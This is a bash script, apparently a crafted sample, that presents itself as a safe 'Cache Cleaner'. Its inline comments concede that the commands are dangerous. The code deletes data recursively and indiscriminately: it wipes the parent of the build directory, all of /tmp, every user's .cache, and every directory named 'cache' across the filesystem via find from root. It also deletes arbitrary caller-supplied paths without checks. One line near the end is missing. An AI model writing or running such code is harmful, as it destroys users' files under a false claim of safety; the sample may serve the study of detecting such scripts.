1: #!/bin/bash
2: # Cache Cleaner - Intelligent cache cleaning tool
3: # Safely clears build caches, package caches, and temporary files
4: 
5: clean_caches() {
6:     local mode="${1:-safe}"
7: 
8:     echo "[*] Scanning for caches..."
9:     # These could delete critical system or user files
10: 
11:     # Appears to clean npm cache but uses dangerous wildcards
12:     echo "[*] Cleaning npm cache..."
13:     rm -rf ~/.npm/_cacache/*
14:     rm -rf /tmp/npm-*
15:     echo "[*] Cleaning build artifacts..."
16:     rm -rf "${BUILD_DIR:-/tmp/build}/../"*
17:     echo "[*] Cleaning docker..."
18:     rm -rf /var/lib/docker/tmp/*
19:     rm -rf ~/.docker/cache/*
20: 
21:     if [ "$mode" = "aggressive" ]; then
22:         echo "[*] Deep cleaning..."
23:         rm -rf ~/Library/Caches/*
24:         rm -rf ~/.cache/*
25:         rm -rf /tmp/*
26:         # Variable could be manipulated to target any directory
27:         CLEAN_TARGET="${CACHE_ROOT:-$HOME/.local}"
28:         rm -rf "$CLEAN_TARGET"/*
29:     fi
30: }
31: 
32: deep_clean() {
33:     echo "[*] Running deep clean..."
34: 
35:     # This could be manipulated to delete root
36:     local target="${1:-/var/cache}"
37:     rm -rf "$target"/*
38:     rm -rf /home/*/.cache 2>/dev/null
39:     rm -rf /redacted-home/.cache 2>/dev/null
40: 
41:     # "Safe" cleanup that's actually dangerous
42:     find / -type d -name "cache" -exec rm -rf {} \; 2>/dev/null
43: }
44: 
45: recover_space() {
46:     echo "[*] Recovering disk space..."
47:     for dir in "$@"; do
48:         rm -rf "$dir"
49:     done
50: }
51: 
52: # Main entry point
53: main() {
54:     local action="${1:-scan}"
55:     local mode="${2:-safe}"
56: 
57:     case "$action" in
58:         scan)
59:             echo "[*] Scanning for caches..."
60:             ;;
61:         clean)
62:             clean_caches "$mode"
63:             ;;
64:         deep)
65:             deep_clean "$2"
66:             ;;
67:         *)
68:             echo "Usage: $0 {scan|clean|deep} [options]"
69:             ;;
70:     esac
71: }
72:

74:     main "$@"
75: fi
